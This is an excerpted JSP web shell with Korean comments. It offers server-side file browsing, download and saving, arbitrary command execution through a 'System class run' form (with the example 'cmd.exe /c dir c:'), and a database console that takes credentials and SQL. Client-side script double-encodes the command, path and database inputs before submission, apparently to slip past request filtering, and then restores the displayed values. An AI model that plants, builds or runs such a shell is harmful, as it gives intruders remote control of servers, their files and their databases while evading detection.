...
void mainForm(String web_Site,JspWriter out)throws Exception{
    ...
    out.print("<tr><td width=60 align=center>FilePath:gg</td><td>");
    // FolderPath: 화면에 표시되는 값 (원본)
    out.print("<input name='FolderPath' id='FolderPath' style='width:100%' value='" + web_Site + "'>");
...
void mainMenu(JspWriter out,String web_Site)throws Exception{
    out.println("<table>");
    out.println("<tr><td bgcolor=White><a href=?Action=M>"+ico(58)+"FileOperation(File.class)</a></td></tr>");
...
void downFile(String filename,HttpServletResponse res)throws Exception{
    ...
    String outFile=new String(b,"UTF-8");
    res.reset();
...
void execFile(String file,JspWriter out)throws Exception{
    ...
    try{
        isr=new InputStreamReader(ps.getInputStream(),"EUC-KR");
...
void ConnectionDBM(JspWriter out,String driver,String url,String userName,String passWord,String sqlAction,String sqlCmd)throws Exception{
    try{
        ...
        out.print("<div style='color:red'><b>Driver not found:</b> "+htmlEntity(e.getMessage())+"</div>");
    }catch (java.sql.SQLInvalidAuthorizationSpecException e){
        out.print("<div style='color:red'><b>Auth error:</b> "+htmlEntity(e.getMessage())+"</div>");
    }catch (java.sql.SQLRecoverableException e){
        out.print("<div style='color:red'><b>Connection error:</b> "+htmlEntity(e.getMessage())+"</div>");
    }catch (java.sql.SQLException e){
        out.print("<div style='color:red'><b>SQL error:</b> "+htmlEntity(e.getMessage())+"</div>");
    }catch (Exception e){
        out.print("<div style='color:red'><b>Error:</b> "+htmlEntity(e.getMessage())+"</div>");
    }
}
...
void systemTools(JspWriter out)throws Exception{
    ...
    out.print("<tr><form method=\"post\" action=\"?Action=run\" onsubmit=\"return encExec(this);\"><td bordercolorlight=Black bgcolor=White>System class run</td><td colspan=\"2\">filepath:<input name=\"execFile\" size=\"75\" type=\"text\" title=\"d:\\\\cmd.exe /c dir c:\"></td><td><input name=\"go\" type=\"submit\" value=\"run\"></td></form></tr>");
    ...
    out.print("</form></tr>");
    out.print("<tr><form method=\"post\" action=\"?Action=sql\" onsubmit=\"return encDB(this);\">");
...
<script>
 ...
 Top = top.address;
  ...
  function checkUrl() {
    var raw = Top.FolderPath.value;          // 화면에 보이는 원본
    var enc = doubleEncode(raw);             // 2중 인코딩

    Top.FolderPath.value = enc;              // 제출용으로 잠깐 바꿈
    Top.Action.value = "F";
    Top.submit();                            // FileFrame 으로 전송

    Top.FolderPath.value = raw;              // 곧바로 화면 값 복구 (항상 원본 표시)
  }
    ...
    function setDataBase(f){
        ...
        driverName[4]="com.ibm.db2.jcc.DB2Driver";
    ...
    function encExec(f) {
        var raw = f.execFile.value;          // 화면에 보이는 원본
        var enc = doubleEncode(raw);         // 2중 인코딩

        f.execFile.value = enc;              // 제출용으로 잠깐 바꿈
        // 제출 직후 화면 값 복구 (사용자 경험 유지)
        setTimeout(function(){ f.execFile.value = raw; }, 0);
        return true;
  }

  function encDB(f){
    var fields = ['driver','conUrl','user','password','sqlcmd'];
    var raw = {};
    fields.forEach(function(n){
      if(!f[n]) return;
      raw[n] = f[n].value;                 // 화면표시용 원본
      f[n].value = doubleEncode(raw[n]);   // 제출용 2중 인코딩
    });
    // 제출 직후 즉시 화면값 복구 (UX 유지)
    setTimeout(function(){
      fields.forEach(function(n){
        if(!f[n]) return;
        f[n].value = raw[n];
...
<%
    ...
    try{
        switch(action){
            ...
            case 'K':saveFile(encodeChange(request.getParameter("filename")),request.getParameter("FileContent").getBytes("UTF-8"),out);break;
